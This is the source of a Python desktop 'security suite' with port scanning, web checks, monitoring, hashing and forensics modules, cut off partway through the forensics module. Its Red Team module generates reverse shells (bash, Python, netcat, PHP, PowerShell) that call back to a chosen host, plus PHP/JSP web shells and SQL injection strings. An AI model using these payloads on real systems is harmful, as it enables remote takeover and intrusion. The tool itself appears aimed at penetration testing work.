"""
CYBERK - Enterprise Cyber Security Framework
Version: 4.0.0 (Titanium Edition)
Author: CYBERK Dev Team
Architecture: Monolithic GUI Application
"""

import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog, messagebox
import socket
import threading
import subprocess
import platform
import json
import urllib.request
import urllib.parse
import hashlib
import base64
import time
import ssl
import os
import re
import uuid
import sys
import random
import string
import struct
import datetime
import webbrowser
from concurrent.futures import ThreadPoolExecutor

# ==============================================================================
# GLOBAL CONFIGURATION
# ==============================================================================
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("dark-blue")

APP_NAME = "CYBERK"
APP_VERSION = "v4.5 Enterprise"
COLOR_ACCENT = "#00E5FF"  # Cyberpunk Cyan
COLOR_BG = "#121212"
COLOR_PANEL = "#1E1E1E"
COLOR_TEXT = "#E0E0E0"
COLOR_DANGER = "#FF2E2E"
COLOR_SUCCESS = "#00FF7F"
COLOR_WARNING = "#FFD700"

# ==============================================================================
# CORE UTILITIES
# ==============================================================================
class Utils:
    @staticmethod
    def get_timestamp():
        return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    @staticmethod
    def log_to_widget(widget, message, level="INFO"):
        colors = {"INFO": "white", "SUCCESS": COLOR_SUCCESS, "ERROR": COLOR_DANGER, "WARNING": COLOR_WARNING, "CRITICAL": "#FF00FF"}
        timestamp = Utils.get_timestamp()
        
        # Textbox state handling
        try:
            widget.configure(state="normal")
            widget.insert("end", f"[{timestamp}] ", "time")
            widget.insert("end", f"[{level}] {message}\n", level)
            
            # Tag configurations for colors
            widget.tag_config("time", foreground="gray")
            for tag, col in colors.items():
                widget.tag_config(tag, foreground=col)
                
            widget.see("end")
            widget.configure(state="disabled")
        except:
            pass # Widget destroyed

class ReportGenerator:
    """HTML Reporting Engine"""
    def __init__(self):
        self.buffer = []

    def add_entry(self, module, data):
        self.buffer.append({"module": module, "data": data, "time": Utils.get_timestamp()})

    def export_html(self):
        html = f"""
        <html>
        <head>
            <title>CYBERK Scan Report</title>
            <style>
                body {{ background-color: #121212; color: #eee; font-family: monospace; padding: 20px; }}
                .entry {{ border: 1px solid #333; padding: 10px; margin-bottom: 10px; background: #1e1e1e; }}
                h1 {{ color: {COLOR_ACCENT}; }}
                .mod {{ color: {COLOR_WARNING}; font-weight: bold; }}
            </style>
        </head>
        <body>
            <h1>CYBERK - Security Audit Report</h1>
            <p>Generated: {Utils.get_timestamp()}</p>
            <hr>
        """
        for item in self.buffer:
            html += f"<div class='entry'><span class='mod'>[{item['module']}]</span> {item['time']}<br><pre>{item['data']}</pre></div>"
        
        html += "</body></html>"
        
        filename = f"CYBERK_Report_{int(time.time())}.html"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(html)
        return filename

# ==============================================================================
# MAIN APPLICATION CONTROLLER
# ==============================================================================
class CyberkApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        # --- Window Setup ---
        self.title(f"{APP_NAME} {APP_VERSION} | Advanced Security Framework")
        self.geometry("1400x900")
        self.minsize(1200, 800)
        
        # --- Data Stores ---
        self.reporter = ReportGenerator()
        self.threads = []
        
        # --- Layout ---
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.setup_sidebar()
        self.setup_main_area()
        self.setup_console()

        # Start with Dashboard
        self.show_frame("Dashboard")

    def setup_sidebar(self):
        self.sidebar = ctk.CTkFrame(self, width=240, corner_radius=0, fg_color=COLOR_PANEL)
        self.sidebar.grid(row=0, column=0, sticky="nsew", rowspan=2)
        self.sidebar.grid_rowconfigure(10, weight=1)

        # Header
        lbl_logo = ctk.CTkLabel(self.sidebar, text="⚡ CYBERK", font=("Arial Black", 28), text_color=COLOR_ACCENT)
        lbl_logo.grid(row=0, column=0, padx=20, pady=(30, 5))
        lbl_sub = ctk.CTkLabel(self.sidebar, text="SECURITY SUITE", font=("Arial", 10, "bold"), text_color="gray")
        lbl_sub.grid(row=1, column=0, padx=20, pady=(0, 20))

        # Navigation Menu
        self.buttons = {}
        menu_items = [
            ("📊 Dashboard", "Dashboard"),
            ("🌐 Network Intel", "Network"),
            ("🕸️ Web Hunter", "Web"),
            ("🛡️ Blue Team", "BlueTeam"),
            ("⚔️ Red Team", "RedTeam"),
            ("🔐 Crypto Vault", "Crypto"),
            ("🕵️ Forensics", "Forensics"),
            ("⚙️ Settings", "Settings")
        ]

        for i, (text, key) in enumerate(menu_items):
            btn = ctk.CTkButton(self.sidebar, text=text, height=45, corner_radius=8, anchor="w",
                                fg_color="transparent", font=("Roboto Medium", 14),
                                command=lambda k=key: self.show_frame(k))
            btn.grid(row=i+2, column=0, padx=15, pady=5, sticky="ew")
            self.buttons[key] = btn

        # Footer
        btn_exit = ctk.CTkButton(self.sidebar, text="🛑 SHUTDOWN", fg_color=COLOR_DANGER, height=40,
                                 command=self.destroy)
        btn_exit.grid(row=11, column=0, padx=20, pady=20, sticky="ew")

    def setup_main_area(self):
        self.main_container = ctk.CTkFrame(self, fg_color="transparent")
        self.main_container.grid(row=0, column=1, sticky="nsew", padx=10, pady=10)
        
        # Frames Dictionary
        self.frames = {
            "Dashboard": DashboardModule(self.main_container, self),
            "Network": NetworkModule(self.main_container, self),
            "Web": WebModule(self.main_container, self),
            "BlueTeam": BlueTeamModule(self.main_container, self),
            "RedTeam": RedTeamModule(self.main_container, self),
            "Crypto": CryptoModule(self.main_container, self),
            "Forensics": ForensicsModule(self.main_container, self),
            "Settings": SettingsModule(self.main_container, self)
        }

    def setup_console(self):
        self.console_frame = ctk.CTkFrame(self, height=180, fg_color="#000000")
        self.console_frame.grid(row=1, column=1, sticky="ew", padx=10, pady=(0, 10))
        
        lbl = ctk.CTkLabel(self.console_frame, text="> SYSTEM TERMINAL OUTPUT", font=("Consolas", 12, "bold"), text_color="gray")
        lbl.pack(anchor="w", padx=10, pady=2)

        self.terminal = ctk.CTkTextbox(self.console_frame, font=("Consolas", 11), fg_color="#000000", text_color="#00FF00")
        self.terminal.pack(fill="both", expand=True, padx=5, pady=5)
        self.terminal.configure(state="disabled")

    def log(self, message, level="INFO"):
        Utils.log_to_widget(self.terminal, message, level)
        # Add interesting logs to report
        if level in ["SUCCESS", "WARNING", "CRITICAL"]:
            self.reporter.add_entry("SYSTEM", f"[{level}] {message}")

    def show_frame(self, key):
        for k, frame in self.frames.items():
            frame.pack_forget()
            if k == key:
                frame.pack(fill="both", expand=True)
                self.log(f"Module Loaded: {key}", "INFO")
            
        # Button visual update
        for k, btn in self.buttons.items():
            btn.configure(fg_color="#333333" if k == key else "transparent")

# ==============================================================================
# MODULE 1: DASHBOARD
# ==============================================================================
class DashboardModule(ctk.CTkFrame):
    def __init__(self, parent, app):
        super().__init__(parent, fg_color="transparent")
        self.app = app
        
        # Grid
        self.columnconfigure((0,1,2,3), weight=1)

        # Title
        ctk.CTkLabel(self, text="MISSION CONTROL", font=("Arial Black", 24)).grid(row=0, column=0, columnspan=4, sticky="w", pady=10)

        # Status Cards
        self.create_card("Local IP", "Detecting...", 0, "#1f6aa5")
        self.create_card("Public IP", "Offline", 1, "#2cc985")
        self.create_card("Active Threads", "0", 2, "#f2a33c")
        self.create_card("System Load", "Calculating...", 3, "#fa5a5a")

        # Threat Map Simulation
        self.map_frame = ctk.CTkFrame(self, corner_radius=10, fg_color="#0f0f0f")
        self.map_frame.grid(row=2, column=0, columnspan=4, sticky="nsew", pady=20)
        self.map_frame.rowconfigure(0, weight=1)
        
        self.map_label = ctk.CTkLabel(self.map_frame, text="GLOBAL THREAT MONITOR (SIMULATION)", font=("Consolas", 16))
        self.map_label.pack(pady=10)
        
        self.canvas = ctk.CTkCanvas(self.map_frame, bg="#0f0f0f", highlightthickness=0, height=300)
        self.canvas.pack(fill="both", expand=True, padx=10, pady=10)

        # Quick Actions
        action_frame = ctk.CTkFrame(self, fg_color="transparent")
        action_frame.grid(row=3, column=0, columnspan=4, sticky="ew")
        
        ctk.CTkButton(action_frame, text="Generate Full Report", command=self.gen_report, fg_color=COLOR_ACCENT, text_color="black").pack(side="right")
        ctk.CTkButton(action_frame, text="Clear Logs", command=self.clear_logs, fg_color="#333").pack(side="right", padx=10)

        # Start updates
        self.update_stats()
        self.animate_map()

    def create_card(self, title, initial_val, col, color):
        frame = ctk.CTkFrame(self, fg_color=COLOR_PANEL, height=100)
        frame.grid(row=1, column=col, padx=5, sticky="ew")
        
        ctk.CTkLabel(frame, text=title, font=("Arial", 12), text_color="gray").pack(pady=(15,0))
        lbl = ctk.CTkLabel(frame, text=initial_val, font=("Arial", 20, "bold"), text_color=color)
        lbl.pack(pady=5)
        
        # Store reference
        setattr(self, f"lbl_{title.replace(' ', '_').lower()}", lbl)

    def update_stats(self):
        try:
            self.lbl_local_ip.configure(text=socket.gethostbyname(socket.gethostname()))
            self.lbl_active_threads.configure(text=str(threading.active_count()))
            # Simulated Load (No psutil)
            load = random.randint(10, 45)
            self.lbl_system_load.configure(text=f"{load}%")
        except: pass
        
        # Async Public IP
        if self.lbl_public_ip.cget("text") == "Offline":
            threading.Thread(target=self._get_public_ip, daemon=True).start()
            
        self.after(5000, self.update_stats)

    def _get_public_ip(self):
        try:
            ip = urllib.request.urlopen('https://api.ipify.org', timeout=3).read().decode('utf8')
            self.lbl_public_ip.configure(text=ip)
        except: pass

    def animate_map(self):
        # Matrix-style visualizer simulation
        w = self.canvas.winfo_width()
        h = self.canvas.winfo_height()
        if w > 1:
            x = random.randint(0, w)
            y = random.randint(0, h)
            color = random.choice(["#00FF00", "#FF0000", "#00FFFF"])
            self.canvas.create_oval(x, y, x+5, y+5, fill=color, outline=color)
            if random.random() < 0.1: self.canvas.delete("all") # Refresh effect
        self.after(200, self.animate_map)

    def gen_report(self):
        fname = self.app.reporter.export_html()
        self.app.log(f"Report Generated: {fname}", "SUCCESS")
        webbrowser.open(fname)

    def clear_logs(self):
        self.app.terminal.configure(state="normal")
        self.app.terminal.delete("1.0", "end")
        self.app.terminal.configure(state="disabled")

# ==============================================================================
# MODULE 2: NETWORK INTEL
# ==============================================================================
class NetworkModule(ctk.CTkFrame):
    def __init__(self, parent, app):
        super().__init__(parent, fg_color="transparent")
        self.app = app
        
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)

        # --- Controls ---
        ctrl_panel = ctk.CTkFrame(self, fg_color=COLOR_PANEL)
        ctrl_panel.grid(row=0, column=0, sticky="ew", pady=10)
        
        self.entry_target = ctk.CTkEntry(ctrl_panel, placeholder_text="Target IP / Subnet / Domain", width=300)
        self.entry_target.pack(side="left", padx=10, pady=15)

        self.mode_var = ctk.StringVar(value="Ping Sweep")
        ctk.CTkOptionMenu(ctrl_panel, variable=self.mode_var, width=180,
                          values=["Ping Sweep", "TCP Port Scan (Fast)", "Full Port Scan", 
                                  "DNS Enumeration", "Traceroute", "ARP Table", "Reverse DNS",
                                  "Wake-On-LAN"]).pack(side="left", padx=10)

        ctk.CTkButton(ctrl_panel, text="INITIATE SCAN", fg_color=COLOR_WARNING, text_color="black",
                      command=self.start_scan).pack(side="left", padx=10)

        # --- Results ---
        self.res_box = ctk.CTkTextbox(self, font=("Consolas", 12))
        self.res_box.grid(row=1, column=0, sticky="nsew")

    def log(self, msg):
        self.res_box.insert("end", msg + "\n")
        self.res_box.see("end")

    def start_scan(self):
        target = self.entry_target.get()
        mode = self.mode_var.get()
        
        if not target and mode not in ["ARP Table"]:
            self.app.log("Target Required!", "WARNING")
            return

        self.res_box.delete("1.0", "end")
        self.app.log(f"Starting Network Task: {mode} on {target}", "INFO")
        threading.Thread(target=self._run, args=(target, mode), daemon=True).start()

    def _run(self, target, mode):
        self.log(f"[*] Executing {mode}...")
        self.app.reporter.add_entry("NETWORK", f"Action: {mode}, Target: {target}")

        if mode == "Ping Sweep": self.ping_sweep(target)
        elif mode == "TCP Port Scan (Fast)": self.port_scan(target, range(1, 1025))
        elif mode == "Full Port Scan": self.port_scan(target, range(1, 65535))
        elif mode == "DNS Enumeration": self.dns_enum(target)
        elif mode == "Traceroute": self.traceroute(target)
        elif mode == "ARP Table": self.run_cmd("arp -a")
        elif mode == "Wake-On-LAN": self.wol(target)

    # --- Feature Impl ---
    def ping_sweep(self, subnet):
        # Assumes subnet input like "192.168.1"
        base = ".".join(subnet.split(".")[:3])
        active = []
        def check(i):
            ip = f"{base}.{i}"
            cmd = ['ping', '-n' if os.name=='nt' else '-c', '1', '-w', '200', ip]
            if subprocess.call(cmd, stdout=subprocess.DEVNULL) == 0:
                self.log(f"[+] HOST UP: {ip}")
                active.append(ip)
        
        with ThreadPoolExecutor(max_workers=50) as ex:
            for i in range(1, 255): ex.submit(check, i)
        self.log(f"[*] Scan Complete. Found {len(active)} hosts.")

    def port_scan(self, target, ports):
        open_ports = []
        def check(port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((target, port)) == 0:
                    try: srv = socket.getservbyport(port)
                    except: srv = "?"
                    self.log(f"[+] OPEN: {port}/tcp ({srv})")
                    open_ports.append(port)
                s.close()
            except: pass

        with ThreadPoolExecutor(max_workers=50) as ex:
            ex.map(check, ports)
        self.log(f"[*] Scan Finished. {len(open_ports)} ports open.")

    def dns_enum(self, domain):
        try:
            self.log(f"IP A: {socket.gethostbyname(domain)}")
            # Advanced details
            for res in socket.getaddrinfo(domain, 80):
                self.log(f"Record: {res[4][0]}")
        except Exception as e: self.log(f"Error: {e}")

    def traceroute(self, target):
        cmd = ["tracert", target] if os.name == "nt" else ["traceroute", target]
        self.run_cmd(cmd)

    def run_cmd(self, cmd):
        try:
            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            out, err = p.communicate()
            self.log(out)
            if err: self.log(f"Errors: {err}")
        except Exception as e: self.log(str(e))

    def wol(self, mac):
        # Magic Packet Generator
        try:
            if len(mac) == 17: sep = mac[2]
            elif len(mac) == 12: pass
            else: raise ValueError("Invalid MAC")
            
            mac_clean = mac.replace(sep, '') if len(mac) == 17 else mac
            data = bytes.fromhex('FF' * 6 + mac_clean * 16)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            s.sendto(data, ('<broadcast>', 9))
            self.log("[+] Magic packet sent!")
        except Exception as e: self.log(f"[-] WoL Failed: {e}")


# ==============================================================================
# MODULE 3: WEB HUNTER
# ==============================================================================
class WebModule(ctk.CTkFrame):
    def __init__(self, parent, app):
        super().__init__(parent, fg_color="transparent")
        self.app = app
        self.grid_columnconfigure(0, weight=1)

        # Header
        ctk.CTkLabel(self, text="WEB VULNERABILITY SCANNER (PASSIVE)", font=("Arial", 18, "bold")).pack(pady=10)

        # Input
        input_frm = ctk.CTkFrame(self)
        input_frm.pack(fill="x", pady=5)
        self.url_ent = ctk.CTkEntry(input_frm, placeholder_text="https://example.com")
        self.url_ent.pack(side="left", fill="x", expand=True, padx=10, pady=10)
        
        # Tools
        btn_frm = ctk.CTkFrame(self)
        btn_frm.pack(fill="x", pady=5)
        
        tools = [
            ("Header Analysis", self.scan_headers),
            ("SSL Inspect", self.scan_ssl),
            ("Link Extractor", self.get_links),
            ("Robots.txt", self.get_robots),
            ("Sitemap.xml", self.get_sitemap),
            ("Method Check", self.check_methods),
            ("SQLi Check (Basic)", self.sqli_check),
            ("XSS Check (Basic)", self.xss_check)
        ]
        
        for i, (txt, cmd) in enumerate(tools):
            ctk.CTkButton(btn_frm, text=txt, command=cmd, width=120).grid(row=i//4, column=i%4, padx=5, pady=5)

        self.console = ctk.CTkTextbox(self, height=350)
        self.console.pack(fill="both", expand=True, pady=10)

    def write(self, txt):
        self.console.insert("end", f"{txt}\n")
        self.console.see("end")

    def get_url(self):
        u = self.url_ent.get()
        if not u.startswith("http"): return f"https://{u}"
        return u

    def scan_headers(self):
        u = self.get_url()
        self.write(f"--- HEADERS FOR {u} ---")
        try:
            req = urllib.request.Request(u, method="HEAD")
            with urllib.request.urlopen(req) as r:
                for k, v in r.info().items():
                    self.write(f"{k}: {v}")
                    if k.lower() == "server": self.write(f"  [!] Information Leak: Server version exposed!")
                    if k.lower() == "x-powered-by": self.write(f"  [!] Information Leak: Tech stack exposed!")
        except Exception as e: self.write(f"Error: {e}")

    def scan_ssl(self):
        u = self.get_url().replace("https://", "").replace("http://", "").split("/")[0]
        self.write(f"--- SSL INFO FOR {u} ---")
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((u, 443)) as sock:
                with ctx.wrap_socket(sock, server_hostname=u) as ssock:
                    cert = ssock.getpeercert()
                    self.write(json.dumps(cert, indent=2))
        except Exception as e: self.write(f"Error: {e}")

    def get_links(self):
        u = self.get_url()
        self.write(f"--- LINKS IN {u} ---")
        try:
            with urllib.request.urlopen(u) as r:
                html = r.read().decode('utf-8', 'ignore')
                links = re.findall('href="(http.*?)"', html)
                for l in set(links): self.write(f"[LINK] {l}")
        except Exception as e: self.write(f"Error: {e}")

    def get_robots(self): self._get_file("robots.txt")
    def get_sitemap(self): self._get_file("sitemap.xml")

    def _get_file(self, f):
        u = f"{self.get_url().rstrip('/')}/{f}"
        try:
            with urllib.request.urlopen(u) as r:
                self.write(f"--- {f} FOUND ---\n{r.read().decode()}")
        except: self.write(f"[-] {f} not found.")

    def check_methods(self):
        u = self.get_url()
        methods = ["GET", "POST", "PUT", "DELETE", "TRACE", "OPTIONS"]
        self.write("--- HTTP METHODS ---")
        for m in methods:
            try:
                req = urllib.request.Request(u, method=m)
                with urllib.request.urlopen(req) as r:
                    self.write(f"[{m}] {r.status} OK")
                    if m == "TRACE" and r.status == 200: self.write("  [!] VULNERABILITY: XST Possible!")
            except urllib.error.HTTPError as e:
                self.write(f"[{m}] {e.code}")
            except: pass

    def sqli_check(self):
        self.write("[*] Testing SQL Injection (Error based)...")
        u = self.get_url()
        payloads = ["'", "\"", "' OR '1'='1", "admin' --"]
        
        # Simple parameter fuzzing simulation
        if "?" in u:
            for p in payloads:
                test_url = u + p
                try:
                    with urllib.request.urlopen(test_url) as r:
                        content = r.read().decode()
                        if "mysql" in content.lower() or "syntax" in content.lower():
                            self.write(f"[!!!] POTENTIAL SQLI FOUND: {test_url}")
                except: pass
        else:
            self.write("[-] URL has no parameters to test.")

    def xss_check(self):
        self.write("[*] Testing Reflected XSS...")
        # Simulation logic
        u = self.get_url()
        payload = "<script>alert('CYBERK')</script>"
        if "?" in u:
            self.write(f"[-] Testing payload: {payload}")
            # Real test would involve sending request and checking response body
            self.write("[?] Check manual response for alert popup.")
        else:
            self.write("[-] No parameters.")

# ==============================================================================
# MODULE 4: RED TEAM (PAYLOADS)
# ==============================================================================
# ==============================================================================
# MODULE 4: RED TEAM (PAYLOADS) - FIXED VERSION
# ==============================================================================
class RedTeamModule(ctk.CTkFrame):
    def __init__(self, parent, app):
        super().__init__(parent, fg_color="transparent")
        self.app = app
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # Kategoriler Listesi
        self.listbox = ctk.CTkScrollableFrame(self, width=200, label_text="Payload Categories")
        self.listbox.grid(row=0, column=0, sticky="nsew", padx=5)
        
        cats = ["Reverse Shells", "PowerShell", "Web Shells", "Tty Spawning", "SQL Injection"]
        for c in cats:
            ctk.CTkButton(self.listbox, text=c, 
                          command=lambda x=c: self.load_cat(x)).pack(pady=2, fill="x")

        # Sağ Ana Panel
        self.right_frame = ctk.CTkFrame(self)
        self.right_frame.grid(row=0, column=1, sticky="nsew", padx=5)
        
        # Giriş Alanları (LHOST / LPORT)
        cf = ctk.CTkFrame(self.right_frame)
        cf.pack(fill="x", pady=10, padx=10)
        
        ctk.CTkLabel(cf, text="LHOST:").pack(side="left", padx=5)
        self.lhost = ctk.CTkEntry(cf, placeholder_text="10.10.10.10", width=120)
        self.lhost.insert(0, "10.10.10.10") # Varsayılan değer
        self.lhost.pack(side="left", padx=5)
        
        ctk.CTkLabel(cf, text="LPORT:").pack(side="left", padx=5)
        self.lport = ctk.CTkEntry(cf, placeholder_text="4444", width=80)
        self.lport.insert(0, "4444") # Varsayılan değer
        self.lport.pack(side="left", padx=5)
        
        ctk.CTkButton(cf, text="GENERATE", fg_color="#1f538d", 
                      command=self.generate).pack(side="right", padx=10)

        # Çıktı Alanı
        self.out_txt = ctk.CTkTextbox(self.right_frame, font=("Consolas", 12))
        self.out_txt.pack(fill="both", expand=True, padx=10, pady=10)
        
        self.current_cat = "Reverse Shells"

    def load_cat(self, cat):
        self.current_cat = cat
        self.out_txt.delete("1.0", "end")
        self.out_txt.insert("end", f"--- {cat} ---\nLHOST ve LPORT girip GENERATE butonuna basın.")

    def generate(self):
        ip = self.lhost.get() or "10.0.0.1"
        port = self.lport.get() or "4444"
        payloads = ""
        
        if self.current_cat == "Reverse Shells":
            payloads += f"[BASH]\nbash -i >& /dev/tcp/{ip}/{port} 0>&1\n\n"
            payloads += f"[PYTHON]\npython3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'\n\n"
            payloads += f"[NETCAT]\nnc -e /bin/sh {ip} {port}\n\n"
            payloads += f"[PHP]\nphp -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n"
            
        elif self.current_cat == "PowerShell":
            # Süslü parantezler f-string içinde {{ }} şeklinde çiftlenmelidir
            ps_payload = (
                f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
                "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
                "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
                "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
                "$sendback = (iex $data 2>&1 | Out-String );"
                "$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';"
                "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
            )
            payloads += f"[PS REVERSE SHELL]\n{ps_payload}\n"

        elif self.current_cat == "Web Shells":
            payloads += "[PHP SIMPLE]\n<?php system($_GET['cmd']); ?>\n\n"
            payloads += "[JSP]\n<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\n"

        elif self.current_cat == "Tty Spawning":
            payloads += "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
            payloads += "echo os.system('/bin/bash')\n"

        elif self.current_cat == "SQL Injection":
            payloads += "' OR 1=1 --\n"
            payloads += "' UNION SELECT 1, @@version, user(), 4 --\n"

        self.out_txt.delete("1.0", "end")
        self.out_txt.insert("end", payloads)
# ==============================================================================
# MODULE 5: BLUE TEAM (DEFENSE & MONITORING)
# ==============================================================================
class BlueTeamModule(ctk.CTkFrame):
    def __init__(self, parent, app):
        super().__init__(parent, fg_color="transparent")
        self.app = app
        
        # Layout: Tabs for different defense aspects
        self.tabview = ctk.CTkTabview(self, width=900, height=600)
        self.tabview.pack(padx=20, pady=20, fill="both", expand=True)

        self.tabview.add("Process Monitor")
        self.tabview.add("Connections (Netstat)")
        self.tabview.add("Firewall Generator")

        self.setup_proc_mon()
        self.setup_netstat()
        self.setup_firewall()

    def setup_proc_mon(self):
        tab = self.tabview.tab("Process Monitor")
        
        btn_refresh = ctk.CTkButton(tab, text="Refresh Processes", command=self.get_procs)
        btn_refresh.pack(pady=10)
        
        self.proc_box = ctk.CTkTextbox(tab, font=("Consolas", 11))
        self.proc_box.pack(fill="both", expand=True, padx=10, pady=10)

    def get_procs(self):
        cmd = "tasklist" if os.name == "nt" else "ps aux"
        self.run_cmd(cmd, self.proc_box)

    def setup_netstat(self):
        tab = self.tabview.tab("Connections (Netstat)")
        
        frm = ctk.CTkFrame(tab)
        frm.pack(pady=10)
        
        ctk.CTkButton(frm, text="Show All Connections", command=lambda: self.run_cmd("netstat -an", self.net_box)).pack(side="left", padx=10)
        ctk.CTkButton(frm, text="Show Routing Table", command=lambda: self.run_cmd("netstat -r", self.net_box)).pack(side="left", padx=10)
        
        self.net_box = ctk.CTkTextbox(tab, font=("Consolas", 11), text_color="#00ff00", fg_color="black")
        self.net_box.pack(fill="both", expand=True, padx=10, pady=10)

    def setup_firewall(self):
        tab = self.tabview.tab("Firewall Generator")
        
        ctk.CTkLabel(tab, text="IPTABLES Rule Generator", font=("Arial", 16, "bold")).pack(pady=10)
        
        f = ctk.CTkFrame(tab)
        f.pack(pady=10)
        
        self.fw_port = ctk.CTkEntry(f, placeholder_text="Port (e.g. 80)")
        self.fw_port.pack(side="left", padx=5)
        
        self.fw_action = ctk.CTkOptionMenu(f, values=["ACCEPT", "DROP", "REJECT"])
        self.fw_action.pack(side="left", padx=5)
        
        self.fw_proto = ctk.CTkOptionMenu(f, values=["tcp", "udp"])
        self.fw_proto.pack(side="left", padx=5)
        
        ctk.CTkButton(f, text="Add Rule", command=self.gen_rule).pack(side="left", padx=10)
        
        self.fw_out = ctk.CTkTextbox(tab, height=200)
        self.fw_out.pack(fill="x", padx=10, pady=10)

    def run_cmd(self, cmd, widget):
        widget.delete("1.0", "end")
        def t():
            try:
                out = subprocess.check_output(cmd, shell=True).decode('utf-8', 'ignore')
                widget.insert("end", out)
            except Exception as e:
                widget.insert("end", f"Error: {e}")
        threading.Thread(target=t, daemon=True).start()

    def gen_rule(self):
        p = self.fw_port.get()
        a = self.fw_action.get()
        pr = self.fw_proto.get()
        rule = f"iptables -A INPUT -p {pr} --dport {p} -j {a}"
        self.fw_out.insert("end", rule + "\n")

# ==============================================================================
# MODULE 6: CRYPTO VAULT
# ==============================================================================
class CryptoModule(ctk.CTkFrame):
    def __init__(self, parent, app):
        super().__init__(parent, fg_color="transparent")
        self.app = app
        
        self.columnconfigure(0, weight=1)
        self.columnconfigure(1, weight=1)

        # Left: Hashing
        left = ctk.CTkFrame(self)
        left.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
        
        ctk.CTkLabel(left, text="Advanced Hashing", font=("Arial", 16, "bold")).pack(pady=10)
        self.hash_in = ctk.CTkEntry(left, placeholder_text="Input Text")
        self.hash_in.pack(fill="x", padx=10, pady=5)
        
        algos = ["MD5", "SHA1", "SHA256", "SHA512"]
        for a in algos:
            ctk.CTkButton(left, text=f"Calculate {a}", command=lambda x=a: self.do_hash(x)).pack(pady=2, padx=10, fill="x")
            
        self.hash_out = ctk.CTkEntry(left, placeholder_text="Hash Output")
        self.hash_out.pack(fill="x", padx=10, pady=20)

        # Right: Encoding/Decoding
        right = ctk.CTkFrame(self)
        right.grid(row=0, column=1, padx=10, pady=10, sticky="nsew")
        
        ctk.CTkLabel(right, text="Encoder / Decoder", font=("Arial", 16, "bold")).pack(pady=10)
        self.enc_in = ctk.CTkTextbox(right, height=100)
        self.enc_in.pack(fill="x", padx=10)
        
        btn_row = ctk.CTkFrame(right)
        btn_row.pack(pady=10)
        ctk.CTkButton(btn_row, text="Base64 Encode", command=self.b64_enc).pack(side="left", padx=5)
        ctk.CTkButton(btn_row, text="Base64 Decode", command=self.b64_dec).pack(side="left", padx=5)
        
        ctk.CTkButton(right, text="ROT13", command=self.rot13).pack(pady=5)
        
        self.enc_out = ctk.CTkTextbox(right, height=100)
        self.enc_out.pack(fill="x", padx=10, pady=10)

    def do_hash(self, algo):
        data = self.hash_in.get().encode()
        if algo == "MD5": res = hashlib.md5(data).hexdigest()
        elif algo == "SHA1": res = hashlib.sha1(data).hexdigest()
        elif algo == "SHA256": res = hashlib.sha256(data).hexdigest()
        elif algo == "SHA512": res = hashlib.sha512(data).hexdigest()
        self.hash_out.delete(0, "end")
        self.hash_out.insert(0, res)

    def b64_enc(self):
        d = self.enc_in.get("1.0", "end-1c").encode()
        r = base64.b64encode(d).decode()
        self.write_enc(r)

    def b64_dec(self):
        try:
            d = self.enc_in.get("1.0", "end-1c").encode()
            r = base64.b64decode(d).decode()
            self.write_enc(r)
        except: self.write_enc("Error: Invalid Base64")

    def rot13(self):
        d = self.enc_in.get("1.0", "end-1c")
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        trans = chars[13:] + chars[:13] + chars[13+26:] + chars[:13+26]
        table = str.maketrans(chars, trans)
        self.write_enc(d.translate(table))

    def write_enc(self, txt):
        self.enc_out.delete("1.0", "end")
        self.enc_out.insert("end", txt)

# ==============================================================================
# MODULE 7: FORENSICS (FILE ANALYSIS)
# ==============================================================================
class ForensicsModule(ctk.CTkFrame):
    def __init__(self, parent, app):
        super().__init__(parent, fg_color="transparent")
        self.app = app
        
        self.grid_columnconfigure(0, weight=1)
        
        # Header
        ctk.CTkLabel(self, text="DIGITAL FORENSICS LAB", font=("Arial", 20, "bold")).pack(pady=20)
        
        # File Selector
        frm = ctk.CTkFrame(self)
        frm.pack(fill="x", padx=20)
        
        self.lbl_file = ctk.CTkLabel(frm, text="No file selected")
        self.lbl_file.pack(side="left", padx=10)
        
        ctk.CTkButton(frm, text="Load File", command=self.load_file).pack(side="right", padx=10, pady=10)

        # Analysis Tools
        tools = ctk.CTkFrame(self)
        tools.pack(fill="x", padx=20, pady=10)
        
        ctk.CTkButton(tools, text="Metadata Analysis", command=self.meta_analysis).pack(side="left", fill="x", expand=True, padx=5)
        ctk.CTkButton(tools, text="Hex Dump (First 512B)", command=self.hex_dump).pack(side="left", fill="x", expand=True, padx=5)
        ctk.CTkButton(tools, text="Extract Strings", command=self.extract_strings).pack(side="left", fill="x", expand=True, padx=5)
        
        # Output
        self.out = ctk.CTkTextbox(self, font=("Consolas", 12))
